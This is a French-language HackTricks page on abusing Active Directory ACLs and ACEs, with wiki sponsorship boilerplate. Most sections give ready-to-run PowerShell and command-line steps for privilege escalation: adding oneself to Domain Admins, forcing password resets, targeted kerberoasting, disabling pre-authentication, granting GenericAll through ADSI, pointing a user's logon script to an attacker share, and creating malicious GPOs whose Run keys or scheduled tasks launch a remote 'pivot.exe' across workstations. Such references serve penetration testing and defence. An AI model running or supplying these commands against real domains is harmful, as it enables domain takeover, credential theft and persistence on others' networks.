# Abus des ACL/ACE d'Active Directory

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes sur l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Cette page est principalement un résumé des techniques de [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) et [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges). Pour plus de détails, consultez les articles originaux.**

## **Droits GenericAll sur l'utilisateur**
Ce privilège accorde à un attaquant un contrôle total sur un compte utilisateur cible. Une fois que les droits `GenericAll` sont confirmés en utilisant la commande `Get-ObjectAcl`, un attaquant peut :

- **Changer le mot de passe de la cible** : En utilisant `net user <nom_utilisateur> <mot_de_passe> /domain`, l'attaquant peut réinitialiser le mot de passe de l'utilisateur.
- **Kerberoasting ciblé** : Attribuer un SPN au compte de l'utilisateur pour le rendre kerberoastable, puis utiliser Rubeus et targetedKerberoast.py pour extraire et tenter de craquer les hachages de tickets de concession de ticket (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Ciblage de l'ASREPRoasting**: Désactivez la pré-authentification pour l'utilisateur, rendant leur compte vulnérable à l'ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Droits GenericAll sur le groupe**
Ce privilège permet à un attaquant de manipuler les appartenances à un groupe s'ils ont des droits `GenericAll` sur un groupe comme `Domain Admins`. Après avoir identifié le nom distinctif du groupe avec `Get-NetGroup`, l'attaquant peut :

- **S'ajouter au groupe Domain Admins** : Cela peut être fait via des commandes directes ou en utilisant des modules comme Active Directory ou PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**
Détenir ces privilèges sur un objet ordinateur ou un compte utilisateur permet :

- **Délégation contrainte basée sur les ressources Kerberos** : Permet de prendre le contrôle d'un objet ordinateur.
- **Informations d'identification fantômes** : Utilisez cette technique pour vous faire passer pour un ordinateur ou un compte utilisateur en exploitant les privilèges pour créer des informations d'identification fantômes.

## **WriteProperty on Group**
Si un utilisateur a des droits `WriteProperty` sur tous les objets pour un groupe spécifique (par exemple, `Domain Admins`), ils peuvent :

- **Se rajouter au groupe Domain Admins** : Réalisable en combinant les commandes `net user` et `Add-NetGroupUser`, cette méthode permet une élévation de privilèges au sein du domaine.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Auto-adhésion (Auto-adhésion) au groupe**
Ce privilège permet aux attaquants de s'ajouter à des groupes spécifiques, tels que `Domain Admins`, via des commandes qui manipulent directement l'appartenance au groupe. L'utilisation de la séquence de commandes suivante permet l'auto-ajout :
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Auto-adhésion)**
Un privilège similaire, cela permet aux attaquants de s'ajouter directement à des groupes en modifiant les propriétés des groupes s'ils ont le droit `WriteProperty` sur ces groupes. La confirmation et l'exécution de ce privilège sont effectuées avec :
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**
Détenir le `ExtendedRight` sur un utilisateur pour `User-Force-Change-Password` permet de réinitialiser les mots de passe sans connaître le mot de passe actuel. La vérification de ce droit et son exploitation peuvent être effectuées via PowerShell ou des outils en ligne de commande alternatifs, offrant plusieurs méthodes pour réinitialiser le mot de passe d'un utilisateur, y compris des sessions interactives et des commandes en une ligne pour les environnements non interactifs. Les commandes vont des invocations simples de PowerShell à l'utilisation de `rpcclient` sur Linux, démontrant la polyvalence des vecteurs d'attaque.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner sur un groupe**
Si un attaquant découvre qu'il a des droits `WriteOwner` sur un groupe, il peut changer la propriété du groupe pour la sienne. Cela est particulièrement impactant lorsque le groupe en question est `Domain Admins`, car le changement de propriété permet d'avoir un contrôle plus large sur les attributs du groupe et ses membres. Le processus implique d'identifier le bon objet via `Get-ObjectAcl` puis d'utiliser `Set-DomainObjectOwner` pour modifier le propriétaire, soit par SID soit par nom.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite sur l'utilisateur**
Cette autorisation permet à un attaquant de modifier les propriétés de l'utilisateur. Plus précisément, avec l'accès `GenericWrite`, l'attaquant peut changer le chemin du script de connexion d'un utilisateur pour exécuter un script malveillant lors de la connexion de l'utilisateur. Cela est réalisé en utilisant la commande `Set-ADObject` pour mettre à jour la propriété `scriptpath` de l'utilisateur cible afin de pointer vers le script de l'attaquant.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite sur un groupe**
Avec ce privilège, les attaquants peuvent manipuler l'appartenance à un groupe, comme s'ajouter eux-mêmes ou d'autres utilisateurs à des groupes spécifiques. Ce processus implique la création d'un objet d'identification, l'utilisation de celui-ci pour ajouter ou supprimer des utilisateurs d'un groupe, et vérifier les changements d'appartenance avec des commandes PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
La possession d'un objet AD et le fait d'avoir des privilèges `WriteDACL` sur celui-ci permettent à un attaquant de s'octroyer des privilèges `GenericAll` sur l'objet. Cela est réalisé grâce à la manipulation d'ADSI, permettant un contrôle total sur l'objet et la capacité de modifier ses appartenances à des groupes. Malgré cela, des limitations existent lors de la tentative d'exploitation de ces privilèges en utilisant les cmdlets `Set-Acl` / `Get-Acl` du module Active Directory.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Réplication sur le Domaine (DCSync)**
L'attaque DCSync exploite des autorisations spécifiques de réplication sur le domaine pour imiter un contrôleur de domaine et synchroniser des données, y compris les informations d'identification des utilisateurs. Cette technique puissante nécessite des autorisations telles que `DS-Replication-Get-Changes`, permettant aux attaquants d'extraire des informations sensibles de l'environnement AD sans accès direct à un contrôleur de domaine.
[**En savoir plus sur l'attaque DCSync ici.**](../dcsync.md)







## Délégation de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Délégation de GPO

L'accès délégué pour gérer les objets de stratégie de groupe (GPO) peut présenter des risques de sécurité importants. Par exemple, si un utilisateur tel que `offense\spotless` se voit déléguer des droits de gestion de GPO, il peut disposer de privilèges tels que **WriteProperty**, **WriteDacl**, et **WriteOwner**. Ces autorisations peuvent être abusées à des fins malveillantes, comme identifié en utilisant PowerView:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### Énumérer les autorisations de GPO

Pour identifier les GPO mal configurés, les cmdlets de PowerSploit peuvent être enchaînés. Cela permet de découvrir les GPO que peut gérer un utilisateur spécifique:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**Ordinateurs avec une Politique Donnée Appliquée**: Il est possible de déterminer quels ordinateurs une GPO spécifique s'applique, aidant à comprendre l'ampleur de l'impact potentiel.
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**Politiques Appliquées à un Ordinateur Donné**: Pour voir quelles politiques sont appliquées à un ordinateur particulier, des commandes comme `Get-DomainGPO` peuvent être utilisées.

**OUs avec une Politique Donnée Appliquée**: Identifier les unités organisationnelles (OUs) affectées par une politique donnée peut se faire en utilisant `Get-DomainOU`.

### Abuser des GPO - New-GPOImmediateTask

Les GPO mal configurés peuvent être exploités pour exécuter du code, par exemple, en créant une tâche planifiée immédiate. Cela peut être fait pour ajouter un utilisateur au groupe des administrateurs locaux sur les machines affectées, élevant considérablement les privilèges:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Module GroupPolicy - Abus du GPO

Le module GroupPolicy, s'il est installé, permet la création et le lien de nouveaux GPO, et le réglage des préférences telles que les valeurs du registre pour exécuter des portes dérobées sur les ordinateurs affectés. Cette méthode nécessite la mise à jour du GPO et la connexion d'un utilisateur à l'ordinateur pour l'exécution :
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abus de GPO

SharpGPOAbuse propose une méthode pour abuser des GPO existantes en ajoutant des tâches ou en modifiant des paramètres sans avoir besoin de créer de nouvelles GPO. Cet outil nécessite la modification des GPO existantes ou l'utilisation des outils RSAT pour en créer de nouvelles avant d'appliquer des modifications:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forcer la mise à jour de la stratégie

Les mises à jour des GPO se produisent généralement toutes les 90 minutes. Pour accélérer ce processus, surtout après avoir implémenté un changement, la commande `gpupdate /force` peut être utilisée sur l'ordinateur cible pour forcer une mise à jour immédiate de la stratégie. Cette commande garantit que toutes les modifications apportées aux GPO sont appliquées sans attendre le prochain cycle de mise à jour automatique.

### Sous le capot

Lors de l'inspection des tâches planifiées pour une GPO donnée, comme la `Politique mal configurée`, l'ajout de tâches telles que `evilTask` peut être confirmé. Ces tâches sont créées à travers des scripts ou des outils en ligne de commande visant à modifier le comportement du système ou à escalader les privilèges.

La structure de la tâche, comme indiqué dans le fichier de configuration XML généré par `New-GPOImmediateTask`, décrit les spécificités de la tâche planifiée - y compris la commande à exécuter et ses déclencheurs. Ce fichier représente comment les tâches planifiées sont définies et gérées au sein des GPO, offrant une méthode pour exécuter des commandes ou des scripts arbitraires dans le cadre de l'application des politiques.

### Utilisateurs et Groupes

Les GPO permettent également la manipulation des adhésions d'utilisateurs et de groupes sur les systèmes cibles. En éditant directement les fichiers de politique des Utilisateurs et Groupes, les attaquants peuvent ajouter des utilisateurs à des groupes privilégiés, tels que le groupe local `administrateurs`. Cela est possible grâce à la délégation des permissions de gestion des GPO, qui permet la modification des fichiers de politique pour inclure de nouveaux utilisateurs ou modifier les adhésions de groupe.

Le fichier de configuration XML pour les Utilisateurs et Groupes décrit comment ces changements sont implémentés. En ajoutant des entrées à ce fichier, des utilisateurs spécifiques peuvent se voir accorder des privilèges élevés sur l'ensemble des systèmes affectés. Cette méthode offre une approche directe pour l'escalade de privilèges à travers la manipulation des GPO.

De plus, d'autres méthodes pour exécuter du code ou maintenir la persistance, telles que l'utilisation de scripts de connexion/déconnexion, la modification des clés de registre pour les autoruns, l'installation de logiciels via des fichiers .msi, ou l'édition des configurations de services, peuvent également être envisagées. Ces techniques offrent divers moyens de maintenir l'accès et de contrôler les systèmes cibles à travers l'abus des GPO.



## Références

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
